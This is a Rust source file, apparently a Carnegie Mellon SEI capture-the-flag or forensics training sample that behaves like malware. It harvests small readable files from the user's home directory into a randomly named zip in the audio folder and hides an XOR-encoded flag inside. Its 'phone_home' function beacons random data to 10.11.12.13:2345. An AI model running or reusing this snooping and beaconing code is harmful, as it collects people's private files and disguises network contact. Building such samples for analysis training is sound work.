// Copyright 2022 Carnegie Mellon University.
// Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
// root or contact permission@sei.cmu.edu for full terms.

extern crate dirs;
extern crate rand;
extern crate zip;

use std::fs;
use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream};
use std::path::PathBuf;
use std::{thread, time};

use rand::{distributions::Alphanumeric, Rng};

static MAX_FILE_SIZE: u64 = 100;

const WRAPPER_CODED: [u8; 9] = [184, 43, 145, 62, 83, 191, 3, 160, 178];
const WRAPPER_XOR: [u8; 9] = [200, 89, 244, 77, 48, 202, 115, 219, 207];

#[cfg(feature = "version_1")]
const FLAG_KEY: [u8; 16] = [
    56, 22, 72, 7, 104, 191, 49, 132, 125, 77, 66, 163, 35, 197, 169, 81,
];
#[cfg(feature = "version_1")]
const FLAG_XOR: [u8; 16] = [
    0, 112, 127, 102, 88, 140, 85, 224, 72, 44, 113, 150, 66, 161, 145, 51,
];

#[cfg(feature = "version_2")]
const FLAG_KEY: [u8; 16] = [
    196, 46, 212, 202, 239, 93, 93, 26, 19, 152, 90, 154, 222, 226, 142, 148,
];
#[cfg(feature = "version_2")]
const FLAG_XOR: [u8; 16] = [
    253, 22, 176, 242, 221, 62, 101, 124, 34, 250, 105, 252, 191, 134, 182, 163,
];

#[cfg(feature = "version_3")]
const FLAG_KEY: [u8; 16] = [
    197, 39, 38, 241, 77, 16, 231, 190, 100, 213, 106, 134, 253, 220, 34, 201,
];
#[cfg(feature = "version_3")]
const FLAG_XOR: [u8; 16] = [
    166, 19, 20, 144, 122, 113, 214, 220, 84, 226, 82, 182, 203, 184, 67, 173,
];

#[cfg(feature = "version_4")]
const FLAG_KEY: [u8; 16] = [
    139, 219, 196, 58, 91, 24, 174, 153, 236, 235, 144, 48, 82, 250, 154, 236,
];
#[cfg(feature = "version_4")]
const FLAG_XOR: [u8; 16] = [
    178, 237, 242, 94, 105, 47, 151, 253, 138, 220, 168, 7, 97, 158, 254, 138,
];

fn visit(dir: PathBuf) -> Vec<Vec<u8>> {
    let mut file_bundle = vec![];

    let entries = match fs::read_dir(dir) {
        Ok(ent) => ent,
        Err(_) => return file_bundle,
    };

    for entry in entries {
        let path = match entry {
            Ok(ent) => ent.path(),
            Err(_) => return file_bundle,
        };

        if path.is_dir() {
            let res = visit(path);
            file_bundle.extend_from_slice(&res);
        } else {
            let metadata = match fs::metadata(&path) {
                Ok(m) => m,
                Err(_) => continue,
            };
            if metadata.len() <= MAX_FILE_SIZE && metadata.len() > 4 {
                let mut file = match fs::File::open(path) {
                    Ok(f) => f,
                    Err(_) => continue,
                };
                let mut contents = vec![];
                if let Err(_) = file.read_to_end(&mut contents) {
                    continue;
                };

                // Check if the file's contents are actually intelligible. Otherwise discard it and
                // move on.
                let readable = match String::from_utf8(contents) {
                    Ok(v) => v,
                    Err(_) => continue,
                };

                // Still need it as bytes...
                file_bundle.push(readable.into_bytes());
            }
        }
    }

    file_bundle
}

fn snoop() -> Vec<Vec<u8>> {
    let home = dirs::home_dir().unwrap();
    visit(home)
}

fn export(files: Vec<Vec<u8>>) {
    let mut out_path = dirs::audio_dir().unwrap();
    let zip_name: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .collect();
    out_path.push(zip_name);

    let zip_file = match fs::File::create(out_path) {
        Ok(f) => f,
        Err(_) => return,
    };

    let mut zip_struct = zip::ZipWriter::new(zip_file);
    let zip_opts =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);

    for (i, f) in files.iter().enumerate() {
        if let Err(_) = zip_struct.start_file(format!("{}", i), zip_opts) {
            continue;
        };

        if let Err(_) = zip_struct.write(f) {
            continue;
        };
    }

    let mut flag = vec![];

    let wrapper_iter = WRAPPER_CODED.iter().zip(&WRAPPER_XOR);
    for (k, x) in wrapper_iter.clone().take(8) {
        flag.push(k ^ x);
    }

    for (k, x) in FLAG_KEY.iter().zip(&FLAG_XOR) {
        flag.push(k ^ x);
    }

    let (k, x) = wrapper_iter.rev().next().unwrap();
    flag.push(k ^ x);
    flag.push('\n' as u8);

    if let Err(e) = zip_struct.start_file("flag.txt", zip_opts) {
        panic!(format!(
            "Please notify the support team that you have encountered this error: {}",
            e
        ));
    }

    if let Err(e) = zip_struct.write(&flag) {
        panic!(format!(
            "Please notify the support team that you have encountered this error: {}",
            e
        ));
    }
}

fn phone_home() {
    if let Ok(mut connection) = TcpStream::connect("10.11.12.13:2345") {
        let nonsense: String = rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(100000)
            .collect();
        if let Err(_) = connection.write_all(nonsense.as_bytes()) {};
        let mut buffer = Vec::new();
        if let Err(_) = connection.read_to_end(&mut buffer) {};
        thread::sleep(time::Duration::from_secs(10));
        if let Err(_) = connection.shutdown(Shutdown::Both) {};
    };
}

fn main() {
    let readable_files = snoop();
    export(readable_files);
    phone_home();
}
